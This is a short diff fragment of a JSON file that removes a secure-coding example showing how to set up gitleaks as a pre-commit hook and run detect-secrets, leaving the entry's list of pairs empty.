-          "correct": {
-            "lang": "bash",
-            "code": "# ✅ Install gitleaks as a pre-commit hook\n# .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/gitleaks/gitleaks\n    rev: v8.18.4\n    hooks:\n      - id: gitleaks\n\n# Install and enable:\n# pip install pre-commit\n# pre-commit install\n\n# ✅ Or use detect-secrets for baseline approach\n# pip install detect-secrets\n# detect-secrets scan > .secrets.baseline\n# detect-secrets audit .secrets.baseline\n\n# ✅ CI step (GitHub Actions)\n# .github/workflows/security.yml"
-          }
-        }
-      ]
+      "pairs": []
     }
   ]
 }
